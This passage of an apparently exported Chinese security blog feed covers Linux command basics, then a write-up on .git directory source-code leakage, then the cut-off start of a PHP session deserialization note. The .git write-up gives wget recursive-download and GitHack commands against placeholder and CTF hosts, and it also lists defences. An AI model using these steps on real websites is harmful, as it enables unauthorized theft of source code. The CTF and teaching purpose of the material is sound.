命令可以同时删除文件或目录</p><h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> [-f-i-r-v] [dirName/dir]<br></code></pre></td></tr></table></figure><h3 id="适用对象-1"><a href="#适用对象-1" class="headerlink" title="适用对象"></a>适用对象</h3><p>所有使用者</p><h3 id="功能-8"><a href="#功能-8" class="headerlink" title="功能"></a>功能</h3><p>删除文件或目录</p><h3 id="常用选项-6"><a href="#常用选项-6" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-f 即使文件属性为只读(即写保护)，亦直接删除</li><li>-i 删除前逐一询问确认</li><li>-r 删除目录及其下所有文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> text.txt<br></code></pre></td></tr></table></figure><p>删除文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r test1<br></code></pre></td></tr></table></figure><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自 执行。</p><p>sudo通常用于安装软件或编辑用户主目录以外的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install strings<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cd</span> /root/<br></code></pre></td></tr></table></figure><p>在运行键入的命令前，它会要求输入管理员密码</p><p>开启root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -i<br></code></pre></td></tr></table></figure><h2 id="vim（vi）编辑发法"><a href="#vim（vi）编辑发法" class="headerlink" title="vim（vi）编辑发法"></a>vim（vi）编辑发法</h2><p>直接输入，就可以编辑文件，没有文件会自动创建一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi filename.txt 回车<br></code></pre></td></tr></table></figure><p>然后按a或i进入编辑模式，输入想要添加的文本，然后按esc退出编辑模式，输入:wq保存并退出</p><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>echo命令在终端中显示定义的文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cool message&quot;</span><br></code></pre></td></tr></table></figure><p>用echo新建文件，讲文本添加到文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a sample text&quot;</span> &gt;&gt; filename.txt<br></code></pre></td></tr></table></figure><p>使用echo命令打印所有的文件和文件夹（ls命令的替代）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> *<br></code></pre></td></tr></table></figure><p>还可以使用echo来输出文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;fileName)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>在上面的命令中，’&lt;’是重定向符，用于改变标准输入的源（从键盘改为文件fileName)；&lt;fileName将<br>fileName文件输入到stdin中。$(&lt;fileName)用于获取stdin中的数据</p><p>如果一个文件是unicode编码，则利用下面这条命令，可以转化为中文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;fileName)</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> [选项] [文件]<br></code></pre></td></tr></table></figure><h3 id="功能-9"><a href="#功能-9" class="headerlink" title="功能"></a>功能</h3><p>查看目标文件的内容</p><h3 id="常用选项-7"><a href="#常用选项-7" class="headerlink" title="常用选项"></a>常用选项</h3><ul><li>-b 对非空输出行编号</li><li>-n 对输出的所有行编号</li><li>-s 不输出多行空行 一般直接使用</li></ul><h3 id="举例-6"><a href="#举例-6" class="headerlink" title="举例"></a>举例</h3><p>一般直接使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> text.txt<br></code></pre></td></tr></table></figure><p>cat指令也可以编辑文件文本（如果没有该文件会直接创建）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt;&gt; test.txt<br></code></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序 列，以换行符或空字符结束。</p><h3 id="语法-10"><a href="#语法-10" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings [选项] 文件<br></code></pre></td></tr></table></figure><h3 id="常用选项-部分"><a href="#常用选项-部分" class="headerlink" title="常用选项(部分)"></a>常用选项(部分)</h3><ul><li>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</li><li>-f –print-file-name：在显示字符串前先显示文件名</li></ul><h3 id="举例-7"><a href="#举例-7" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings filename提取文件中的字符串<br>strings filename &gt; output.txt将输出结果写入文件<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git和Git文件导致源码泄露</title>
    <link href="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>参考文章</p><blockquote><p>Git文件泄露漏洞：<a href="https://blog.csdn.net/qq_45521281/article/details/105767428">https://blog.csdn.net/qq_45521281/article/details/105767428</a></p></blockquote><h1 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h1><p>Git是目前世界上最先进的免费开源分布式版本控制系统，其诞生主要是为了高效管理像 Linux 内核这种规模的庞大项目</p><h2 id="什么是版本控制系统"><a href="#什么是版本控制系统" class="headerlink" title="什么是版本控制系统"></a>什么是版本控制系统</h2><p>版本控制系统（Version Control System，VCS）是一种在软件开发过程中用于管理文件和项目版本的工具，可以记录文件内容的变化，让用户查看特定版本的文件内容，还能再不同版本之间进行切换，同时也方便团队成员协作开发</p><p>版本控制系统类型有：本地版本控制系统、集中式版本控制系统、分布式版本控制系统</p><h3 id="本地版本控制系统"><a href="#本地版本控制系统" class="headerlink" title="本地版本控制系统"></a>本地版本控制系统</h3><p>这种系统只在本地对文件的不同版本进行管理。它会在本地保存文件的多个版本，通过简单的数据库来记录文件的更新。例如 RCS（Revision Control System），它在本地磁盘上保存补丁集（文件修订前后的差异），通过应用这些补丁集来重现文件的各个版本。</p><h3 id="集中式版本控制系统"><a href="#集中式版本控制系统" class="headerlink" title="集中式版本控制系统"></a>集中式版本控制系统</h3><p>该系统有一个集中管理的服务器，保存所有文件的修订版本，而协同工作的开发者们的客户端则从服务器获取最新的文件或者提交更新。SVN（Subversion）就是典型的集中式版本控制系统。其优点是方便管理员对版本库进行管理，缺点是依赖中央服务器，若服务器出现故障，团队成员就无法正常工作。</p><h3 id="分布式版本控制系统"><a href="#分布式版本控制系统" class="headerlink" title="分布式版本控制系统"></a>分布式版本控制系统</h3><p>每个开发者的本地都有完整的版本库副本，包含所有的历史版本信息。Git 是分布式版本控制系统的代表。在分布式系统中，开发者可以在本地进行各种版本控制操作，如提交、创建分支等，不需要依赖网络连接到中央服务器。团队成员之间的协作可以通过推送和拉取操作在不同的本地仓库之间进行。</p><h2 id="版本库、工作区和暂存区"><a href="#版本库、工作区和暂存区" class="headerlink" title="版本库、工作区和暂存区"></a>版本库、工作区和暂存区</h2><h3 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h3><p>版本库（Repository），也被称作仓库，是版本控制系统的核心组件，用于存储项目的所有文件及其历史版本信息，集中存储项目所有文件版本信息的地方，版本控制系统会对文件的每一次修改进行记录，包括修改的内容、时间、作者等，这些信息都被保存在版本库中。</p><p>版本库可以简单理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p><h4 id="本地版本库"><a href="#本地版本库" class="headerlink" title="本地版本库"></a>本地版本库</h4><p>存在于开发者本地计算机中的版本库。开发者可以在本地对版本库进行各种操作，如提交、查看历史记录等，无需依赖网络连接。例如使用 Git 时，在项目目录下执行<code>git init</code>命令就会在本地创建一个版本库。</p><h4 id="远程版本库"><a href="#远程版本库" class="headerlink" title="远程版本库"></a>远程版本库</h4><p>存储在远程服务器上的版本库，通常用于团队协作开发。团队成员可以从远程版本库克隆项目到本地，进行开发后再将本地的修改推送到远程版本库，与其他成员共享。像 GitHub、GitLab 等平台提供的就是远程版本库服务。</p><h3 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h3><p>工作区指的是你在本地计算机里实际操作的项目目录，就是你能够看到并进行文件编辑、创建、删除等操作的文件夹，简单的说就是电脑中看到的目录。</p><p>在工作区，你能自由修改文件内容，它独立于版本控制系统的其他部分。版本控制系统一开始并不会自动跟踪你在工作区的修改，只有当你执行特定操作时，这些修改才会被纳入版本控制流程。</p><p>假设你使用 Git 管理一个名为<code>my_project</code>的项目，在本地磁盘上的<code>C:\Users\Username\my_project</code>目录就是工作区。你可以在这个目录下使用文本编辑器打开文件进行修改，或者创建新文件。</p><h3 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h3><p>暂存区也被叫做索引（index），它是一个中间区域，用于准备要提交到本地仓库的文件修改。当你对工作区的文件进行修改后，可选择将部分或全部修改添加到暂存区。</p><p>暂存区再版本库里，版本库就是隐藏目录 <code>.git</code></p><p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p><p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p><h1 id="git文件导致的源码泄露"><a href="#git文件导致的源码泄露" class="headerlink" title=".git文件导致的源码泄露"></a>.git文件导致的源码泄露</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>开发人员再开发时，常常会先把源码提交到远程托管网站（如：<code>github</code>），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记删除<code>.git</code>文件，就会导致源码泄露，攻击者就可能会将<code>.git</code>文件夹直接部署到线上环境，这就引起了git泄露漏洞</p><h3 id="git的目录结构"><a href="#git的目录结构" class="headerlink" title="git的目录结构"></a>git的目录结构</h3><p>在一个目录中初始化一个仓库以后，<code>Git</code>会在该目录下创建一个名为<code>.git</code>的隐藏目录（版本库），这个目录中包含了<code>Git</code>仓库的所有元数据和对象数据库（就是这个仓库的所有版本等一系列信息），如下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">.git<span class="hljs-symbol">/</span><br>├── branches<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 旧的分支引用目录，现在基本不再使用</span><br>├── config            <span class="hljs-comment"># 仓库的配置文件，包含仓库级别的配置信息</span><br>├── description       <span class="hljs-comment"># 仓库的描述信息，主要供GitWeb等工具使用</span><br>├── HEAD              <span class="hljs-comment"># 指向当前所在分支的引用</span><br>├── hooks<span class="hljs-symbol">/</span>            <span class="hljs-comment"># 存放钩子脚本的目录，用于在特定的Git操作前后执行自定义脚本</span><br>├── info<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 包含一些仓库的额外信息</span><br>│   └── exclude       <span class="hljs-comment"># 本地的忽略文件，作用类似于 .gitignore</span><br>├── objects<span class="hljs-symbol">/</span>          <span class="hljs-comment"># 存储所有对象数据的目录，如提交对象、树对象、Blob对象等</span><br>│   ├── info<span class="hljs-symbol">/</span><br>│   └── pack<span class="hljs-symbol">/</span><br>├── refs<span class="hljs-symbol">/</span>             <span class="hljs-comment"># 存储引用的目录，如分支、标签等</span><br>│   ├── heads<span class="hljs-symbol">/</span>        <span class="hljs-comment"># 存储本地分支的引用</span><br>│   ├── tags<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 存储标签的引用</span><br>│   └── remotes<span class="hljs-symbol">/</span>      <span class="hljs-comment"># 存储远程分支的引用</span><br>└── index             <span class="hljs-comment"># 暂存区文件，记录了下一次提交时要包含的文件信息</span><br></code></pre></td></tr></table></figure><p>一般来说一个<code>git</code>仓库会存在以下俩文件</p><ol><li>README.md （项目介绍）</li><li><code>.gitignore</code> （配置在git进行文件跟踪的时候忽略掉哪些文件 , 从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志&#x2F;配置文件等敏感文件）</li></ol><h3 id="一般情况下的开发流程"><a href="#一般情况下的开发流程" class="headerlink" title="一般情况下的开发流程"></a>一般情况下的开发流程</h3><ol><li>初始化仓库 , 并将仓库托管在<code>Coding</code>或者<code>Github</code>上 , 便于远程协作&#x2F;备份&#x2F;部署</li><li>在本地进行网站开发 , 并定时提交<code>commit</code> , <code>push</code>到远程托管网站</li><li>当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站<code>pull</code>到<code>Web</code>目录下</li><li>网站正常运行</li></ol><p>这里当网站维护开发人员在从托管网站<code>pull</code>代码的时候，也会将这个存储了所有版本信息的<code>.git</code>文件夹下载到服务器的<code>Web</code>目录下，因此攻击者就可以利用这个目录去下载<code>git</code>文件夹，可以利用其中存储的版本控制信息，完全恢复网站后台的代码和目录结构</p><h2 id="如何利用漏洞"><a href="#如何利用漏洞" class="headerlink" title="如何利用漏洞"></a>如何利用漏洞</h2><h3 id="利用爬虫"><a href="#利用爬虫" class="headerlink" title="利用爬虫"></a>利用爬虫</h3><p>爬虫爬取整个git目录 (这个方法比较原始 , 需要具有一定的Git经验 , 和使用<code>Githack</code>这个工具相比 , 有一个比较好的地方就是 , 可以完全模拟服务器上的代码环境 , 可以跟踪到git的每一次提交 , 但是<code>Githack</code>好像只可以将源码恢复到最近的一次提交，这里的好处还有可以去查看<code>git</code>的提交日志 , 这个日志信息中会有开发人员对每一次<code>commit</code>的描述 , 比如某个BUG的修复等等 , 对于这些和BUG相关的地方 , 可以有针对性地进行白盒审计 , 有可能这个BUG修复了还不如没修复 , 可能会造成更大的漏洞)</p><h4 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h4><ol><li>利用爬虫递归下载<code>.git</code>目录的所有文件</li><li>利用git命令对网站的commit历史进行查看</li><li>利用git命令对网站的源码进行恢复</li></ol><h4 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h4><p>演示网站 : <a href="http://www.xxx.com/.git/">http://www.xxx.com/.git/</a></p><ol><li>在虚拟机中利用<code>wget</code>对该目录进行递归下载(-r)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -r -p -np -k http://www.xxx.com/.git/<br>--recursive（递归）<br>-k,  --convert-links（转换链接）<br>-p,  --page-requisites（页面必需元素）<br>-np, --no-parent（不追溯至父级）<br></code></pre></td></tr></table></figure><ol start="2"><li>下载完成后 , 进入下载的网站目录</li><li>利用命令 : <code>git log</code> 查看网站的提交记录</li><li>利用命令 : <code>git reset --hard [log hash]</code> 恢复到指定版本号 (一般如果只需要得到源码的话就恢复到最近的一次提交)</li></ol><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><ol><li>对.git目录的访问权限进行控制</li><li>在每次pull到web目录下之后删除.git文件夹</li></ol><h3 id="利用GitHack脚本"><a href="#利用GitHack脚本" class="headerlink" title="利用GitHack脚本"></a>利用<code>GitHack</code>脚本</h3><p><code>GitHack</code>是一个<code>.git</code>泄露利用脚本，通过泄露的<code>.git</code>文件夹下的文件，还原重建工程源代码。</p><p><code>GitHack</code>脚本下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h4 id="GitHack脚本的工作原理"><a href="#GitHack脚本的工作原理" class="headerlink" title="GitHack脚本的工作原理"></a><code>GitHack</code>脚本的工作原理</h4><ol><li>解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )</li><li>去<code>.git/objects/</code>文件夹下下载对应的文件</li><li>使用<code>zlib</code>解压文件，按原始的目录结构写入源代码</li></ol><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GitHack.py http://www.example.com/.git/     <span class="hljs-comment">#别忘了最后的.git</span><br></code></pre></td></tr></table></figure><p>还原后的文件在 <strong><code>dist/</code></strong> 目录下</p><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><ol><li>尝试获取 <code>packs</code>克隆</li><li>尝试目录遍历克隆</li><li>尝试从缓存文件(index)、commit记录中恢复</li></ol><h1 id="CTF做题实战"><a href="#CTF做题实战" class="headerlink" title="CTF做题实战"></a>CTF做题实战</h1><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>题目来源</p><blockquote><p><a href="https://ctf.show/challenges#%E7%BB%99%E5%A5%B9-119"><code>ctfshow</code> 萌新赛 给她</a></p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214346166.png" alt="image-20250330214346166"></p><p>看着是要SQL注入，但实际上是要进行<code>.git</code>泄露，这里用<code>GitHack</code>脚本进行泄露</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> GitHack.py https://<span class="hljs-number">6</span>d6e5822-a557-<span class="hljs-number">4</span>a9a-<span class="hljs-number">96</span>c9-<span class="hljs-number">4</span>a46aacb1c63.challenge.ctf.show/.git/<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214644843.png" alt="image-20250330214644843"></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250330214714870.png" alt="image-20250330214714870"></p><p>可以看到源码下载到了这个<code>hint.php</code>文件中了，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;select * from user where name=&#x27;%s&#x27; <span class="hljs-subst">$pass</span>&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里考查<code>sprintf</code>漏洞，之后的见另一个笔记<code>sprintf漏洞</code></p><h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>题目来源</p><blockquote><p>NSSCTF–git泄露</p></blockquote><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250331132139456.png" alt="image-20250331132139456"></p><p>利用<code>GitHack</code>脚本下载得到源码</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> GitHack.<span class="hljs-keyword">py</span> http://node4.anna.nssctf.<span class="hljs-keyword">cn</span>:<span class="hljs-number">28510</span>/.git/<br></code></pre></td></tr></table></figure><p>源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs HTML5">&lt;?php<br>if ($_GET[&#x27;wher3&#x27;] === &#x27;nssc7f&#x27;) &#123;<br>    echo getenv(&#x27;FLAG&#x27;);<br>&#125;<br>?&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;title&gt;NSSCTF | .git泄露&lt;/title&gt;<br><br>&lt;/html&gt;<br><br>&lt;body&gt;flag在哪里？&lt;/body&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/image-20250331132315777.png" alt="image-20250331132315777"></p>]]></content>
    
    
    <categories>
      
      <category>信息搜集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息搜集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Session反序列化</title>
    <link href="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识—session"><a href="#前置知识—session" class="headerlink" title="前置知识—session"></a>前置知识—session</h1><p>当<code>session_start()</code>被调用或者<code>php.ini</code>中<code>session.auto_start</code>为1时，PHP内部调用会话管理器，访问用户<code>session</code>被序列化后，存储到指定目录（默认为<code>/tmp</code>）</p><p>存取格式有多种，常见的有如下三种，主要是前俩</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td><code>php</code></td><td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td><code>php_serialize</code></td><td>经过<code>serialize()</code>函数序列化处理的数组</td></tr><tr><td><code>php_binary</code></td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数反序列化处理的值</td></tr></tbody></table><p>**漏洞产生：**写入格式和读取格式不一致</p><p>如下一句话可以有多种读取方式</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181040224.png" alt="image-20250420181040224"></p><h2 id="php方式存储"><a href="#php方式存储" class="headerlink" title="php方式存储"></a><strong><code>php</code>方式存储</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>刚开始可以看到<code>/tmp</code>目录下是什么都没有的</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420181844079.png" alt="image-20250420181844079"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=123456<br></code></pre></td></tr></table></figure><p>当以GET形式提交参数<code>ben</code>后，再次查看会出现一个<code>sess</code>文件，存储的是刚才提交内容，格式为</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183509582.png" alt="image-20250420183509582"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 键名 + 竖线 + 经过序列化处理后的数据</span><br>benben|s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;<br></code></pre></td></tr></table></figure><p>默认情况下是使用<code>php</code>格式进行储存</p><h2 id="php-serialize方式存储"><a href="#php-serialize方式存储" class="headerlink" title="php_serialize方式存储"></a><code>php_serialize</code>方式存储</h2><p>如果要使用这个格式进行存储，首先要进行一个声明，声明存储格式为<code>php_serialize</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>GET提交两个参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ben</span>=dazhunag&amp;b=666<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420183339176.png" alt="image-20250420183339176"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 经过serialize()函数序列化处理的数组</span><br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="php-binary方式存储"><a href="#php-binary方式存储" class="headerlink" 